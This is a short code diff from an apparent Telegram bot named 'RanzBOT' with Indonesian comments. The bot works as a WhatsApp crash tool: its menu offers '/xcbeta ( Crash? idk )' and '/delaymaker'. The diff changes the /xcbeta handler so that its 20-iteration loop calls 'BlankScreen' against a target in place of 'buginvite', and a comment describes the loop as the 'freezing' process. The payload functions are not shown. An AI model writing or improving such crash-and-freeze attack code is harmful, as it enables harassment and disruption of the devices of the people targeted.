@@ -457,7 +457,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 │
 ㅒ
 │ /xcbeta ( Crash? idk )
-│ /delaymaker 1 hour ( Andro only )
+│ /delaymaker
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1469,10 +1469,10 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 20; i++) {
-        await buginvite(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
+        await BlankScreen(target, { ptcp: true });
+        await BlankScreen(target, { ptcp: true });
+        await BlankScreen(target, { ptcp: true });
+        await BlankScreen(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
